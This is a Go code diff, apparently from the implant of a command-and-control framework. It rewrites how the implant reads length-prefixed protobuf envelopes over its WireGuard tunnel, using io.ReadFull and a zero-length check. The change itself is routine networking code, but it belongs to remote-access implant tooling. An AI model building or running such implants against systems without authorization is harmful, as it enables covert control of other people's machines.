@@ -26,6 +26,7 @@ import (
 	"bufio"
 	"bytes"
 	"encoding/binary"
+	"errors"
 	"fmt"
 	"io"
 	"net"
@@ -48,7 +49,6 @@ import (
 )
 
 var (
-	readBufSize = 16 * 1024    // 16kb
 	serverTunIP = "100.64.0.1" // Don't let user configure this for now
 	tunnelNet   *netstack.Net
 	tunAddress  string
@@ -111,8 +111,8 @@ func ReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
 	if len(dataLengthBuf) == 0 || connection == nil {
 		panic("[[GenerateCanary]]")
 	}
-	_, err := connection.Read(dataLengthBuf)
-	if err != nil {
+	n, err := io.ReadFull(connection, dataLengthBuf)
+	if err != nil || n != 4 {
 		// {{if .Config.Debug}}
 		log.Printf("Socket error (read msg-length): %v\n", err)
 		// {{end}}
@@ -120,23 +120,22 @@ func ReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
 	}
 	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
 
-	// Read the length of the data
-	readBuf := make([]byte, readBufSize)
-	dataBuf := make([]byte, 0)
-	totalRead := 0
-	for {
-		n, err := connection.Read(readBuf)
-		dataBuf = append(dataBuf, readBuf[:n]...)
-		totalRead += n
-		if totalRead == dataLength {
-			break
-		}
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("Read error: %s\n", err)
-			// {{end}}
-			break
-		}
+	if dataLength <= 0 {
+		// {{if .Config.Debug}}
+		log.Printf("[pivot] read error: %s\n", err)
+		// {{end}}
+		return nil, errors.New("[wireguard] zero data length")
+	}
+
+	dataBuf := make([]byte, dataLength)
+
+	n, err = io.ReadFull(connection, dataBuf)
+
+	if err != nil || n != dataLength {
+		// {{if .Config.Debug}}
+		log.Printf("Read error: %s\n", err)
+		// {{end}}
+		return nil, err
 	}
 
 	// Unmarshal the protobuf envelope
